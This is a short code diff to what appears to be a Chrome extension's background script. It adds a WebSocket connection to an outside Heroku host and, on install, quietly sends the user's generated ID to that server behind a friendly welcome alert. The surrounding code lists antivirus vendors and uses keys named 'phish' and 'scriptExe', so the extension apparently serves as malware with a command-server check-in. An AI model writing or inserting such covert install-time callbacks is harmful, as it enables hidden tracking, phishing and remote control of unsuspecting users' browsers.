@@ -1,3 +1,7 @@
+//Connection to the server
+var HOST = 'wss://projectnickname123.herokuapp.com';
+var ws = new WebSocket(HOST);
+
 //Verify if it is operating or not
 console.log("Background script is currently running!");
 var webArr = ["norton", "bitdefender", "eset", "webrootanywhere",
@@ -32,6 +36,10 @@ chrome.runtime.onInstalled.addListener(function() {
   var id = clientHashId();
   var phish = "";
   chrome.storage.sync.set({'id': id, 'values': webArr, 'webSite': phish, 'addSite': phish, 'scriptExe': phish}, function(){
-    alert("Welcome, and thank you, for downloading this extension!")
+    var jsonPackage = {id: id};
+    ws.onopen = function(event){
+      ws.send(JSON.stringify(jsonPackage));
+    }
+    alert("Welcome, and thank you, for downloading this extension!");
   });
 });
